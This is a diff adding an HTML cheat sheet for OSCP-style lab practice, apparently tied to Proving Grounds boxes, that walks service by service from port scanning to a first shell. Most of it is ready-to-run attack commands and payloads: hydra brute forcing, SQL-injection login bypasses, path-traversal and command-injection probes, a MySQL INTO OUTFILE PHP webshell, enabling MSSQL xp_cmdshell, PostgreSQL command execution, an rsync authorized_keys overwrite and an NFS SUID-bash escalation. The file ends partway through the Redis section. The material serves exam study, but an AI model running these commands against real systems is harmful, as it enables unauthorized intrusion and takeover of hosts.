@@ -1,0 +1,2310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FOOTHOLD_PATTERN_BANK // oscp · service enum → first shell</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Stencil+Text:wght@400;700;900&family=JetBrains+Mono:wght@300;400;500;700;800&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-base: #0a0d12; --bg-elev: #11151c; --bg-card: #0f1219; --bg-card-hover: #141823;
+    --border: #1d2230; --border-strong: #2a3145;
+    --text: #d8dde6; --text-dim: #8b94a7; --text-faint: #4a5266;
+    --setup: #ffb547; --setup-soft: #ffb54720;
+    --access: #ff6b6b; --access-soft: #ff6b6b18;
+    --enum: #5ec3e3; --enum-soft: #5ec3e318;
+    --abuse: #d96cd9; --abuse-soft: #d96cd918;
+    --win: #5fd49b; --win-soft: #5fd49b18;
+    --warn: #ff6b6b; --warn-soft: #ff6b6b18;
+    --theme: var(--access); --theme-soft: var(--access-soft);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    background: var(--bg-base); color: var(--text);
+    font-family: 'IBM Plex Sans', -apple-system, sans-serif;
+    font-size: 14px; line-height: 1.5; min-height: 100vh;
+    background-image: radial-gradient(circle at 15% 20%, rgba(255, 107, 107, 0.05) 0%, transparent 40%), radial-gradient(circle at 85% 80%, rgba(95, 212, 155, 0.03) 0%, transparent 40%);
+    background-attachment: fixed;
+  }
+  body::before { content: ''; position: fixed; inset: 0; pointer-events: none;
+    background: repeating-linear-gradient(0deg, rgba(255,255,255,0.012) 0px, rgba(255,255,255,0.012) 1px, transparent 1px, transparent 3px); z-index: 1; }
+  ::selection { background: var(--theme); color: var(--bg-base); }
+  ::-webkit-scrollbar { width: 8px; height: 8px; }
+  ::-webkit-scrollbar-track { background: var(--bg-base); }
+  ::-webkit-scrollbar-thumb { background: var(--border-strong); }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-faint); }
+  a { color: inherit; text-decoration: none; }
+
+  .header { position: sticky; top: 0; z-index: 100; background: rgba(10, 13, 18, 0.94); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); padding: 16px 28px 12px; }
+  .header-top { display: flex; align-items: baseline; justify-content: space-between; gap: 20px; margin-bottom: 12px; }
+  .brand { font-family: 'Big Shoulders Stencil Text', sans-serif; font-weight: 900; font-size: 30px; letter-spacing: 0.08em; line-height: 0.9; text-transform: uppercase; }
+  .brand .ad { color: var(--theme); }
+  .brand-tag { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); letter-spacing: 0.15em; text-transform: uppercase; margin-top: 4px; }
+  .meta { text-align: right; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; }
+  .meta .count { color: var(--win); font-weight: 700; }
+  .search-row { display: flex; gap: 12px; align-items: stretch; }
+  .search-box { flex: 1; position: relative; }
+  .search-input { width: 100%; background: var(--bg-card); border: 1px solid var(--border-strong); color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 14px; font-weight: 500; padding: 11px 90px 11px 36px; outline: none; transition: border-color 0.15s, box-shadow 0.15s; }
+  .search-input:focus { border-color: var(--theme); box-shadow: 0 0 0 3px var(--theme-soft); }
+  .search-input::placeholder { color: var(--text-faint); }
+  .search-prefix { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--theme); font-family: 'JetBrains Mono', monospace; font-weight: 700; pointer-events: none; }
+  .search-kbd { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); display: flex; gap: 4px; pointer-events: none; }
+  .kbd { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-dim); background: var(--bg-base); border: 1px solid var(--border-strong); padding: 2px 6px; letter-spacing: 0.05em; }
+  .nav { margin-top: 12px; display: flex; gap: 4px; flex-wrap: wrap; align-items: center; }
+  .nav-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.15em; margin-right: 8px; }
+  .nav a { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--text-dim); padding: 4px 10px; border: 1px solid var(--border-strong); text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.12s; }
+  .nav a:hover { color: var(--text); border-color: var(--text-dim); }
+  .nav a[data-phase="setup"]:hover { color: var(--setup); border-color: var(--setup); }
+  .nav a[data-phase="access"]:hover { color: var(--access); border-color: var(--access); }
+  .nav a[data-phase="enum"]:hover { color: var(--enum); border-color: var(--enum); }
+  .nav a[data-phase="abuse"]:hover { color: var(--abuse); border-color: var(--abuse); }
+  .nav a[data-phase="win"]:hover { color: var(--win); border-color: var(--win); }
+
+  main { max-width: 1400px; margin: 0 auto; padding: 28px 28px 60px; position: relative; z-index: 2; }
+  .topology { background: var(--bg-card); border: 1px solid var(--border-strong); border-left: 3px solid var(--theme); padding: 16px 18px; margin-bottom: 32px; font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); line-height: 1.7; }
+  .topology h3 { font-size: 11px; color: var(--theme); letter-spacing: 0.18em; text-transform: uppercase; margin-bottom: 8px; font-family: 'JetBrains Mono', monospace; }
+  .topology code { color: var(--text); background: var(--bg-base); padding: 1px 5px; font-size: 11px; }
+
+  section.flow { margin-bottom: 56px; scroll-margin-top: 180px; }
+  .flow-head { display: flex; align-items: baseline; justify-content: space-between; gap: 16px; margin-bottom: 6px; padding-bottom: 8px; border-bottom: 1px solid var(--border-strong); }
+  .flow-num { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); letter-spacing: 0.15em; }
+  .flow-title { font-family: 'JetBrains Mono', monospace; font-size: 22px; font-weight: 800; letter-spacing: 0.02em; flex: 1; }
+  .flow-trigger { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); letter-spacing: 0.05em; text-align: right; max-width: 360px; }
+  .flow-trigger strong { color: var(--theme); font-weight: 500; }
+  .flow-intro { font-size: 13px; color: var(--text-dim); margin-bottom: 18px; max-width: 850px; line-height: 1.65; }
+  .flow-intro code { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; color: var(--text); background: var(--bg-card); padding: 1px 5px; border: 1px solid var(--border); }
+
+  .reminder { display: inline-flex; align-items: center; gap: 6px; background: var(--bg-card); border: 1px dashed var(--border-strong); padding: 6px 12px; font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--text-dim); margin: 8px 8px 8px 0; }
+  .reminder.timing { border-left: 2px solid var(--setup); }
+  .reminder.flag { border-left: 2px solid var(--win); color: var(--win); }
+  .reminder.danger { border-left: 2px solid var(--warn); color: var(--warn); }
+  .reminder::before { font-weight: 800; color: inherit; }
+  .reminder.timing::before { content: '⏱'; }
+  .reminder.flag::before { content: '⚑'; }
+  .reminder.danger::before { content: '⚠'; }
+
+  .diagram { background: var(--bg-card); border: 1px solid var(--border); padding: 20px 16px; margin: 18px 0 22px; overflow-x: auto; }
+  .diagram svg { display: block; width: 100%; height: auto; }
+  .diagram svg .node-rect { fill: var(--bg-base); stroke: var(--border-strong); stroke-width: 1.2; transition: stroke 0.15s, fill 0.15s; }
+  .diagram svg a:hover .node-rect { fill: var(--bg-card-hover); stroke: var(--text-dim); cursor: pointer; }
+  .diagram svg .node-rect.setup  { stroke: var(--setup); }
+  .diagram svg .node-rect.access { stroke: var(--access); }
+  .diagram svg .node-rect.enum   { stroke: var(--enum); }
+  .diagram svg .node-rect.abuse  { stroke: var(--abuse); }
+  .diagram svg .node-rect.win    { stroke: var(--win); }
+  .diagram svg .node-rect.warn   { stroke: var(--warn); stroke-dasharray: 4 3; }
+  .diagram svg .node-text { fill: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; text-anchor: middle; pointer-events: none; }
+  .diagram svg .node-sub { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-anchor: middle; pointer-events: none; }
+  .diagram svg .arrow { stroke: var(--text-faint); stroke-width: 1.2; fill: none; marker-end: url(#arrowhead); }
+  .diagram svg .arrow-strong { stroke: var(--text-dim); stroke-width: 1.5; fill: none; marker-end: url(#arrowhead-strong); }
+  .diagram svg .label { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-anchor: middle; pointer-events: none; }
+  .diagram svg .group-bg { fill: rgba(255, 107, 107, 0.03); stroke: var(--border); stroke-dasharray: 3 3; stroke-width: 1; }
+  .diagram svg .group-label { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; }
+
+  .cards-section { margin-top: 60px; padding-top: 24px; border-top: 1px solid var(--border-strong); scroll-margin-top: 180px; }
+  .filters { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; margin: 14px 0 20px; }
+  .filter-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.15em; margin-right: 4px; }
+  .pill { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; font-weight: 500; color: var(--text-dim); background: transparent; border: 1px solid var(--border-strong); padding: 5px 12px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.12s; user-select: none; }
+  .pill:hover { border-color: var(--text-dim); color: var(--text); }
+  .pill.active { background: var(--theme); color: var(--bg-base); border-color: var(--theme); font-weight: 700; }
+  .pill .pill-count { opacity: 0.65; margin-left: 4px; font-weight: 400; }
+  .pill.active .pill-count { opacity: 0.7; }
+
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 14px; }
+  .card { background: var(--bg-card); border: 1px solid var(--border); padding: 15px 15px 13px; position: relative; transition: border-color 0.15s, background 0.15s; display: flex; flex-direction: column; gap: 9px; scroll-margin-top: 200px; }
+  .card:hover { border-color: var(--border-strong); background: var(--bg-card-hover); }
+  .card[data-phase="setup"]  { border-left: 3px solid var(--setup); }
+  .card[data-phase="access"] { border-left: 3px solid var(--access); }
+  .card[data-phase="enum"]   { border-left: 3px solid var(--enum); }
+  .card[data-phase="abuse"]  { border-left: 3px solid var(--abuse); }
+  .card[data-phase="win"]    { border-left: 3px solid var(--win); }
+  .card.flash { animation: flash 1.2s ease-out; }
+  @keyframes flash { 0%, 30% { background: var(--theme-soft); border-color: var(--theme); } 100% { background: var(--bg-card); border-color: var(--border); } }
+  .card-head { display: flex; justify-content: space-between; align-items: flex-start; gap: 8px; }
+  .card-cat { font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; padding: 2px 6px; border: 1px solid; flex-shrink: 0; white-space: nowrap; }
+  .card[data-phase="setup"]  .card-cat { color: var(--setup); border-color: var(--setup); }
+  .card[data-phase="access"] .card-cat { color: var(--access); border-color: var(--access); }
+  .card[data-phase="enum"]   .card-cat { color: var(--enum); border-color: var(--enum); }
+  .card[data-phase="abuse"]  .card-cat { color: var(--abuse); border-color: var(--abuse); }
+  .card[data-phase="win"]    .card-cat { color: var(--win); border-color: var(--win); }
+  .card-title { font-family: 'JetBrains Mono', monospace; font-size: 13.5px; font-weight: 700; color: var(--text); line-height: 1.3; flex: 1; }
+  .triggers { display: flex; flex-wrap: wrap; gap: 4px; }
+  .trigger { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--theme); background: var(--theme-soft); border: 1px solid var(--theme-soft); padding: 2px 7px; letter-spacing: 0.02em; }
+  .trigger.match { background: var(--theme); color: var(--bg-base); font-weight: 700; }
+  .arrow-line { display: flex; align-items: flex-start; gap: 8px; padding: 8px 10px; background: var(--bg-base); border: 1px solid var(--border); }
+  .arrow { color: var(--win); font-family: 'JetBrains Mono', monospace; font-weight: 800; flex-shrink: 0; }
+  .action { color: var(--text); font-size: 12.5px; line-height: 1.5; }
+  .cmd-wrap { position: relative; }
+  .cmd { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text); background: var(--bg-base); border: 1px solid var(--border); padding: 9px 36px 9px 11px; white-space: pre-wrap; word-break: break-all; line-height: 1.5; overflow-x: auto; }
+  .cmd-copy { position: absolute; top: 4px; right: 4px; background: var(--bg-card); border: 1px solid var(--border-strong); color: var(--text-dim); font-family: 'JetBrains Mono', monospace; font-size: 9px; padding: 3px 6px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.1em; opacity: 0; transition: opacity 0.15s, color 0.15s; }
+  .cmd-wrap:hover .cmd-copy { opacity: 1; }
+  .cmd-copy:hover { color: var(--theme); }
+  .cmd-copy.copied { color: var(--win); border-color: var(--win); opacity: 1; }
+  .cleanup { background: var(--warn-soft); border: 1px solid var(--warn); border-left-width: 3px; padding: 8px 11px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text); line-height: 1.5; white-space: pre-wrap; word-break: break-all; }
+  .cleanup-label { color: var(--warn); font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; display: block; margin-bottom: 4px; font-weight: 700; }
+  .card-foot { display: flex; justify-content: space-between; align-items: center; gap: 8px; margin-top: auto; padding-top: 4px; border-top: 1px dashed var(--border); font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); }
+  .state-tag { color: var(--text-dim); border: 1px solid var(--border); padding: 1px 6px; font-size: 9px; letter-spacing: 0.1em; }
+  .state-tag.user { color: var(--setup); border-color: var(--setup); }
+  .state-tag.admin { color: var(--access); border-color: var(--access); }
+  .state-tag.both { color: var(--text-dim); border-color: var(--border-strong); }
+  mark { background: var(--theme); color: var(--bg-base); padding: 0 2px; font-weight: 700; }
+  .pg-tag { display: inline-block; color: var(--win); background: var(--win-soft); border: 1px solid var(--win); padding: 1px 5px; font-size: 9px; letter-spacing: 0.05em; font-weight: 700; }
+  .empty { text-align: center; padding: 80px 20px; color: var(--text-faint); font-family: 'JetBrains Mono', monospace; }
+  .empty-icon { font-size: 48px; color: var(--border-strong); margin-bottom: 16px; }
+  .empty-title { color: var(--text-dim); font-size: 14px; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.15em; }
+  .empty-hint { font-size: 12px; color: var(--text-faint); }
+  .anti-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 12px; margin-top: 18px; }
+  .anti { background: var(--bg-card); border: 1px solid var(--border); border-left: 3px solid var(--warn); padding: 12px 14px; }
+  .anti-bad { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--warn); margin-bottom: 4px; line-height: 1.4; }
+  .anti-bad::before { content: '✗ '; font-weight: 800; }
+  .anti-fix { font-size: 12px; color: var(--text-dim); line-height: 1.5; }
+  .anti-fix::before { content: '→ '; color: var(--win); font-weight: 800; }
+  .foot-info { margin-top: 60px; padding-top: 20px; border-top: 1px solid var(--border); font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-align: center; line-height: 1.8; letter-spacing: 0.05em; }
+  .foot-info code { color: var(--theme); background: var(--theme-soft); padding: 1px 5px; }
+  .checklist { background: var(--bg-card); border: 1px solid var(--border); padding: 18px 22px; margin: 14px 0 22px; }
+  .checklist-title { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--theme); letter-spacing: 0.18em; text-transform: uppercase; margin-bottom: 12px; }
+  .checklist ul { list-style: none; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 4px 18px; }
+  .checklist li { font-family: 'JetBrains Mono', monospace; font-size: 12px; padding: 5px 0; color: var(--text); display: flex; align-items: flex-start; gap: 9px; line-height: 1.5; cursor: pointer; user-select: none; }
+  .checklist li::before { content: '[ ]'; color: var(--text-faint); font-weight: 700; flex-shrink: 0; transition: color 0.15s; }
+  .checklist li.done { color: var(--text-faint); text-decoration: line-through; }
+  .checklist li.done::before { content: '[✓]'; color: var(--win); }
+  .checklist li code { color: var(--theme); font-size: 11px; }
+  @media (max-width: 720px) {
+    .header { padding: 12px 14px 10px; }
+    main { padding: 18px 14px 40px; }
+    .brand { font-size: 22px; }
+    .grid { grid-template-columns: 1fr; }
+    .search-kbd { display: none; }
+    .flow-head { flex-direction: column; align-items: flex-start; }
+    .flow-trigger { text-align: left; max-width: 100%; }
+  }
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-top">
+    <div>
+      <div class="brand">FOOTHOLD<span class="ad">_</span>PATTERN<span class="ad">_</span>BANK</div>
+      <div class="brand-tag">// oscp · service enum → first shell · pg-grounded</div>
+    </div>
+    <div class="meta">
+      <div>SHOWING <span class="count" id="resultCount">0</span> / <span id="totalCount">0</span></div>
+      <div style="margin-top:4px; opacity:0.6">v1 · foothold · companion to enum/privesc/pivot banks</div>
+    </div>
+  </div>
+  <div class="search-row">
+    <div class="search-box">
+      <span class="search-prefix">▸</span>
+      <input id="search" class="search-input" type="text" autocomplete="off" spellcheck="false"
+        placeholder="search trigger: 'rsync', 'rpcclient', 'ftp anon', 'nfs', 'upload bypass', 'lfi', 'redis', 'tomcat' ..." />
+      <span class="search-kbd"><kbd class="kbd">⌘</kbd><kbd class="kbd">K</kbd></span>
+    </div>
+  </div>
+  <div class="nav">
+    <span class="nav-label">JUMP:</span>
+    <a href="#triage" data-phase="setup">triage</a>
+    <a href="#linux-svc" data-phase="enum">linux-svc</a>
+    <a href="#win-svc" data-phase="enum">win-svc</a>
+    <a href="#web" data-phase="enum">web</a>
+    <a href="#db" data-phase="enum">db</a>
+    <a href="#foothold" data-phase="access">foothold</a>
+    <a href="#web-rce" data-phase="abuse">web→rce</a>
+    <a href="#cards" style="margin-left:auto">all-cards</a>
+  </div>
+</header>
+
+<main>
+
+<div class="topology">
+  <h3>SCOPE · SERVICE ENUMERATION & INITIAL FOOTHOLD</h3>
+  <div>
+    <code>start</code>: nmap output, nothing else ·
+    <code>end</code>: first reverse/bind shell (or valid SSH/WinRM creds) ·
+    <code>principle</code>: <span style="color:var(--theme)">never skip a service</span> — every port gets enum, every port gets default creds attempted ·
+    <code>pg-grounded</code>: cards marked <span class="pg-tag">PG #</span> map to one of your boxes
+  </div>
+</div>
+
+<!-- METHODOLOGY CHECKLIST -->
+<section>
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 00 ]</span>
+      <span class="flow-title" style="color:var(--theme)">METHODOLOGY CHECKLIST · BY SERVICE</span>
+    </div>
+    <div class="flow-trigger">click to mark done · every open port gets the full sweep</div>
+  </div>
+  <p class="flow-intro">
+    Every open port gets the full sweep — not just the interesting-looking ones. Run nmap first, then work each service top-to-bottom. Stuck? You skipped something here. Re-enumerate, don't escalate.
+  </p>
+
+  <div class="checklist">
+    <div class="checklist-title">▸ 0. TRIAGE — run these first, in parallel</div>
+    <ul>
+      <li>Full TCP — <code>sudo nmap -p- --min-rate 5000 -Pn -oN scans/all-tcp.txt &lt;IP&gt;</code></li>
+      <li>Service + scripts on open ports — <code>nmap -sC -sV -p&lt;PORTS&gt; -oN scans/svc.txt &lt;IP&gt;</code></li>
+      <li>UDP top 50 — <code>sudo nmap -sU --top-ports 50 -oN scans/udp.txt &lt;IP&gt;</code></li>
+      <li>Add to /etc/hosts — <code>echo "&lt;IP&gt; &lt;hostname&gt; &lt;FQDN&gt;" | sudo tee -a /etc/hosts</code></li>
+      <li>Searchsploit every service + version in banner — <code>searchsploit &lt;product&gt; &lt;version&gt;</code></li>
+      <li>credential spray queue — build users.txt + pwds.txt from every discovered credential — <code>echo "&lt;new-cred&gt;" &gt;&gt; pwds.txt; echo "&lt;new-user&gt;" &gt;&gt; users.txt</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 1. FTP · 21</div>
+    <ul>
+      <li>Anonymous login — <code>ftp &lt;IP&gt;</code> then user: <code>anonymous</code> pass: (blank)</li>
+      <li>Recursive download — <code>wget -m --no-passive ftp://anonymous:@&lt;IP&gt;/</code></li>
+      <li>Read everything — <code>exiftool *</code> on images (username leaks), strings on binaries</li>
+      <li>Test write — <code>ftp&gt; put test.txt</code> → if writable + web up → drop webshell</li>
+      <li>Banner version → <code>searchsploit vsftpd 2.3.4</code> (or whatever version)</li>
+      <li>Brute last resort — <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://&lt;IP&gt;</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 2. SSH · 22</div>
+    <ul>
+      <li>Banner — <code>ssh -v &lt;IP&gt; 2&gt;&amp;1 | head -5</code> → note OpenSSH version → searchsploit</li>
+      <li>Try any key found anywhere — <code>ssh -i id_rsa &lt;user&gt;@&lt;IP&gt;</code></li>
+      <li>Try found creds — <code>ssh &lt;user&gt;@&lt;IP&gt;</code></li>
+      <li>Audit for weak algos — <code>ssh-audit &lt;IP&gt;</code></li>
+      <li>Brute only as last resort — <code>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://&lt;IP&gt; -t 4</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 3. SMTP · 25 / 587</div>
+    <ul>
+      <li>Banner grab — <code>nc -nv &lt;IP&gt; 25</code> → <code>EHLO test</code></li>
+      <li>User enum (VRFY) — <code>smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t &lt;IP&gt;</code></li>
+      <li>User enum (RCPT TO) — <code>smtp-user-enum -M RCPT -U users.txt -t &lt;IP&gt;</code></li>
+      <li>OpenSMTPD 2.0.0 = RCE (PG Bratarina) — <code>searchsploit OpenSMTPD</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 4. DNS · 53</div>
+    <ul>
+      <li>Zone transfer — <code>dig axfr @&lt;IP&gt; &lt;domain&gt;</code></li>
+      <li>Reverse lookup — <code>dig -x &lt;IP&gt; @&lt;IP&gt;</code></li>
+      <li>Version — <code>dig version.bind chaos txt @&lt;IP&gt;</code></li>
+      <li>Subdomain brute — <code>gobuster dns -d &lt;domain&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r &lt;IP&gt;</code></li>
+      <li>Add every new hostname to /etc/hosts — <code>echo "&lt;IP&gt; &lt;host&gt; &lt;host&gt;.local" | sudo tee -a /etc/hosts</code> — many boxes unlock on vhost discovery</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 5. HTTP · 80 / 443 / 8000 / 8080 / 8443</div>
+    <ul>
+      <li>Fingerprint — <code>whatweb http://&lt;IP&gt;</code> + curl headers — <code>curl -si http://&lt;IP&gt; | head -20</code></li>
+      <li>Source + robots.txt + /.git — view-source &amp;&amp; <code>curl http://&lt;IP&gt;/robots.txt</code></li>
+      <li>Dir bust — <code>feroxbuster -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak -o scans/ferox.txt</code></li>
+      <li>Vhost enum — <code>ffuf -w subdomains-5000.txt -u http://&lt;IP&gt; -H "Host: FUZZ.&lt;domain&gt;" -fc 302,404</code></li>
+      <li>CMS detect → exact version → <code>searchsploit &lt;cms&gt; &lt;version&gt;</code> + ExploitDB web search</li>
+      <li>Default creds — admin:admin, admin:password, admin:&lt;appname&gt;, root:toor</li>
+      <li>Every upload form — try .phtml, .php7, double-ext, GIF89a magic, .htaccess bypass</li>
+      <li>Every URL param — <code>?page=</code>: try <code>../../../etc/passwd</code>; <code>?id=1</code>: try <code>'</code>; <code>?cmd=</code>: try <code>;id</code></li>
+      <li>Auth bypass SQLi — <code>admin'--</code> / <code>' OR 1=1--</code> in login field</li>
+      <li>WebDAV — <code>davtest -url http://&lt;IP&gt;</code> then <code>cadaver http://&lt;IP&gt;</code> to PUT webshell</li>
+      <li>Nikto quick scan — <code>nikto -h http://&lt;IP&gt; -o scans/nikto.txt</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 6. SMB · 139 / 445 + RPC · 135</div>
+    <ul>
+      <li>Version — <code>nmap -p445 --script smb-security-mode,smb2-security-mode &lt;IP&gt;</code></li>
+      <li>Null / guest shares — <code>smbclient -L //&lt;IP&gt; -N</code> and <code>smbclient -L //&lt;IP&gt; -U guest%</code></li>
+      <li>Full null enum — <code>enum4linux-ng -A &lt;IP&gt; 2&gt;/dev/null | tee scans/enum4linux.txt</code></li>
+      <li>RPC null — <code>rpcclient -U "" -N &lt;IP&gt;</code> then <code>enumdomusers</code>, <code>querydominfo</code></li>
+      <li>RID brute — <code>nxc smb &lt;IP&gt; -u '' -p '' --rid-brute 4000</code></li>
+      <li>Read every share — <code>smbclient //&lt;IP&gt;/&lt;share&gt; -N</code> → <code>recurse ON</code> → <code>ls</code> → <code>mget *</code></li>
+      <li>Vuln check — <code>nmap -p445 --script smb-vuln-ms17-010,smb-vuln-ms08-067 &lt;IP&gt;</code></li>
+      <li>After creds — <code>nxc smb &lt;IP&gt; -u &lt;user&gt; -p &lt;pwd&gt; --shares</code> then spider for cleartext</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 7. LDAP · 389 / 636</div>
+    <ul>
+      <li>Anon RootDSE — <code>ldapsearch -x -H ldap://&lt;IP&gt; -s base -b "" "(objectclass=*)"</code></li>
+      <li>Anon full dump — <code>ldapsearch -x -H ldap://&lt;IP&gt; -b "DC=&lt;domain&gt;,DC=local" "(objectclass=*)" 2&gt;/dev/null | tee scans/ldap-anon.txt</code></li>
+      <li>Description fields — grep for password: <code>grep -i "description" scans/ldap-anon.txt</code></li>
+      <li>Authed dump — <code>ldapdomaindump -u '&lt;domain&gt;\&lt;user&gt;' -p '&lt;pwd&gt;' &lt;IP&gt; -o ldap-dump/</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 8. SNMP · 161 UDP</div>
+    <ul>
+      <li>Community brute — <code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;IP&gt;</code></li>
+      <li>Full walk (public) — <code>snmpwalk -v2c -c public &lt;IP&gt; | tee scans/snmpwalk.txt</code></li>
+      <li>Users — <code>snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.4.1.77.1.2.25</code></li>
+      <li>Running processes — <code>snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.2.1.25.4.2.1.2</code></li>
+      <li>Installed software — <code>snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.2.1.25.6.3.1.2</code></li>
+      <li>Grep for creds — <code>grep -i "pass\|pwd\|credential" scans/snmpwalk.txt</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 9. rsync · 873</div>
+    <ul>
+      <li>List modules — <code>rsync rsync://&lt;IP&gt;/</code></li>
+      <li>List module contents — <code>rsync rsync://&lt;IP&gt;/&lt;module&gt;/</code></li>
+      <li>Download all — <code>rsync -av rsync://&lt;IP&gt;/&lt;module&gt;/ ./rsync-dump/</code></li>
+      <li>Write check — if home dir: <code>rsync ~/.ssh/id_rsa.pub rsync://&lt;IP&gt;/home/&lt;user&gt;/.ssh/authorized_keys</code> → ssh root</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 10. Databases · MSSQL 1433 / MySQL 3306 / PostgreSQL 5432</div>
+    <ul>
+      <li>MSSQL — <code>impacket-mssqlclient sa:sa@&lt;IP&gt;</code> or <code>impacket-mssqlclient &lt;domain&gt;/&lt;user&gt;:&lt;pwd&gt;@&lt;IP&gt; -windows-auth</code></li>
+      <li>MSSQL shell — <code>EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;</code> then <code>EXEC xp_cmdshell 'whoami';</code></li>
+      <li>MySQL — <code>mysql -h &lt;IP&gt; -u root -p</code> (try blank, root, toor, mysql)</li>
+      <li>MySQL webshell — <code>SELECT "&lt;?php system($_GET['cmd']);?&gt;" INTO OUTFILE '/var/www/html/shell.php';</code></li>
+      <li>PostgreSQL — <code>psql -h &lt;IP&gt; -U postgres</code> then <code>COPY cmd_exec FROM PROGRAM 'id';</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 11. NFS · 2049</div>
+    <ul>
+      <li>List exports — <code>showmount -e &lt;IP&gt;</code></li>
+      <li>Mount — <code>sudo mount -t nfs &lt;IP&gt;:/&lt;export&gt; /mnt/nfs -nolock</code></li>
+      <li>Check no_root_squash — <code>cat /etc/exports</code> (if on box) or check mount options in showmount output</li>
+      <li>If no_root_squash: drop SUID bash — <code>cp /bin/bash /mnt/nfs/bash; chmod +s /mnt/nfs/bash</code> → on box: <code>/tmp/bash -p</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 12. RDP · 3389 / WinRM · 5985 / VNC · 5900</div>
+    <ul>
+      <li>WinRM reachability — <code>nxc winrm &lt;IP&gt; -u &lt;user&gt; -p &lt;pwd&gt;</code> → Pwn3d! = shell</li>
+      <li>WinRM shell — <code>evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -p &lt;pwd&gt;</code></li>
+      <li>RDP with creds — <code>xfreerdp /v:&lt;IP&gt; /u:&lt;user&gt; /p:&lt;pwd&gt; /drive:kali,/tmp /cert:ignore</code></li>
+      <li>VNC no-auth check — <code>nmap -p5900 --script vnc-info,vnc-brute &lt;IP&gt;</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 13. Redis · 6379</div>
+    <ul>
+      <li>Unauth check — <code>redis-cli -h &lt;IP&gt; ping</code> → PONG = unauth</li>
+      <li>Info dump — <code>redis-cli -h &lt;IP&gt; info</code> → note config dir, dbfilename</li>
